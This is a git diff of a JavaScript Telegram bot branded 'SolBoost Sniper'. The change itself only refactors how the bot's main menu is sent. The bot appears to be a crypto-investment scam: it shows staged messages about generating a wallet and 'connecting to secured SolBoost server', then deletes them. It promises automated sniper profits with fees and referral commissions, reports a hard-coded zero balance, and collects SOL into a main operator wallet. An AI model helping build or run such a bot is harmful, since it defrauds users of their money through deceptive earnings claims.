@@ -6,7 +6,6 @@ import http from 'http';
 
 let userStatus = {}; // Assuming you already have this for storing user-specific data
 let userWallets = {}; // Global initialization
-let menuMessageId = {}; // To store menu message ID for each user
 
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
@@ -36,53 +35,29 @@ const connection = new Connection('https://api.mainnet-beta.solana.com');
 // Main wallet for receiving Solana (base58 private key)
 const mainWallet = Keypair.fromSecretKey(bs58.decode(MAIN_WALLET_PRIVATE_KEY));
 
-// Function to load or edit the main menu
-const sendOrEditMainMenu = async (ctx, userId) => {
-    const mainMenu = Markup.inlineKeyboard([
+// Function to load and send the main menu
+const sendMainMenu = async (ctx) => {
+    return ctx.reply('Please choose an option:', Markup.inlineKeyboard([
         [Markup.button.callback('Main wallet', 'main_wallet'), Markup.button.callback('Start earning', 'start_earning')],
         [Markup.button.callback('Track profits', 'track_profits'), Markup.button.callback('Withdraw', 'withdraw')],
         [Markup.button.callback('Referrals', 'referrals'), Markup.button.callback('Balance', 'balance')],
         [Markup.button.callback('Track SolBoost Activity', 'track_SolBoost')],
         [Markup.button.callback('Refresh', 'refresh')]
-    ]);
-
-    const menuText = 'Please choose an option:';
-
-    if (menuMessageId[userId]) {
-        try {
-            // Attempt to edit the message only if the new text or markup is different
-            const message = await ctx.telegram.getChatMessage(ctx.chat.id, menuMessageId[userId]);
-            if (message.text !== menuText) {
-                await ctx.telegram.editMessageText(ctx.chat.id, menuMessageId[userId], undefined, menuText, mainMenu);
-            }
-        } catch (error) {
-            // Handle cases where the message might have been deleted or is otherwise unavailable
-            if (error.response && error.response.error_code === 400 && error.response.description === 'Bad Request: message is not modified') {
-                console.log('Menu message is the same, no need to edit.');
-            } else {
-                console.error('Error editing menu message:', error);
-            }
-        }
-    } else {
-        const menuMessage = await ctx.reply(menuText, mainMenu);
-        menuMessageId[userId] = menuMessage.message_id;
-    }
+    ]));
 };
-
 
 // Start command
 bot.start(async (ctx) => {
-    const userId = ctx.from.id;
     const firstMessage = await ctx.reply('🔄 Generating your wallet, please wait...');
     const secondMessage = await ctx.reply('🔒 Your wallet is connecting to secured SolBoost server...');
 
-    await sendOrEditMainMenu(ctx, userId);
+    await sendMainMenu(ctx);
 
     await ctx.deleteMessage(firstMessage.message_id);
     await ctx.deleteMessage(secondMessage.message_id);
 });
 
-// The rest of the bot actions remain the same, with the addition of sending or editing the main menu at the end
+// The rest of the bot actions remain the same, with the addition of sending a new menu at the end
 
 bot.action('main_wallet', async (ctx) => {
     try {
@@ -110,7 +85,7 @@ Balance: ${solBalance.toFixed(2).replace(/\./g, '\\.')} SOL \\(\\$${(solBalance 
 ⚠️ Note: A 13% fee is applied to profits
         `;
         await ctx.reply(balanceMessage, { parse_mode: 'MarkdownV2' });
-        await sendOrEditMainMenu(ctx, userId);
+        await sendMainMenu(ctx);
 
     } catch (error) {
         console.error('Error in main_wallet action:', error);
@@ -175,7 +150,7 @@ To activate the SolBoost Sniper bot and start earning profits with our automated
                 await ctx.reply(`Insufficient balance to cover the transaction fee and rent exemption for user ${userId}.`);
             }
         }
-        await sendOrEditMainMenu(ctx, userId);
+        await sendMainMenu(ctx);
     } catch (error) {
         console.error('Error in start_earning action:', error);
         await ctx.reply('There was an error processing your request. Please try again.');
@@ -192,7 +167,7 @@ bot.action('track_profits', async (ctx) => {
         } else {
             await ctx.reply('No transfer detected. Please start earning by transferring SOL to your trading wallet.');
         }
-        await sendOrEditMainMenu(ctx, userId);
+        await sendMainMenu(ctx);
     } catch (error) {
         console.error('Error in track_profits action:', error);
     }
@@ -264,7 +239,7 @@ bot.action('withdraw', async (ctx) => {
         } else {
             await ctx.reply('No funds available for withdrawal. Please start earning first.');
         }
-        await sendOrEditMainMenu(ctx, userId);
+        await sendMainMenu(ctx);
     } catch (error) {
         console.error('Error in withdraw action:', error);
         await ctx.reply('There was an error processing your withdrawal. Please try again.');
@@ -276,7 +251,7 @@ bot.action('referrals', async (ctx) => {
         const userId = ctx.from.id;
         await ctx.answerCbQuery();
         await ctx.reply('Earn 7% commission on each referral.');
-        await sendOrEditMainMenu(ctx, userId);
+        await sendMainMenu(ctx);
     } catch (error) {
         console.error('Error in referrals action:', error);
     }
@@ -287,7 +262,7 @@ bot.action('balance', async (ctx) => {
         const userId = ctx.from.id;
         await ctx.answerCbQuery();
         await ctx.reply('Your current balance is 0 SOL.');
-        await sendOrEditMainMenu(ctx, userId);
+        await sendMainMenu(ctx);
     } catch (error) {
         console.error('Error in balance action:', error);
     }
@@ -298,7 +273,7 @@ bot.action('track_SolBoost', async (ctx) => {
         const userId = ctx.from.id;
         await ctx.answerCbQuery();
         await ctx.reply(`Check out our SolBoost Sniper activity for reference and stay updated with our latest transactions and performance:\n\n@peppermintsnipertrack_bot.`);
-        await sendOrEditMainMenu(ctx, userId);
+        await sendMainMenu(ctx);
     } catch (error) {
         console.error('Error in track_SolBoost action:', error);
     }
@@ -341,7 +316,7 @@ bot.action('refresh', async (ctx) => {
         } else {
             console.log('Balance has not changed. No update needed.');
         }
-        await sendOrEditMainMenu(ctx, userId);
+        await sendMainMenu(ctx);
     } catch (error) {
         console.error('Error in refresh action:', error);
         await ctx.reply('An error occurred while refreshing the balance. Please try again.');
@@ -366,4 +341,3 @@ const showMessageWithDelay = async (ctx, message, delay) => {
 
 bot.launch();
 console.log('Telegram bot is running...');
-
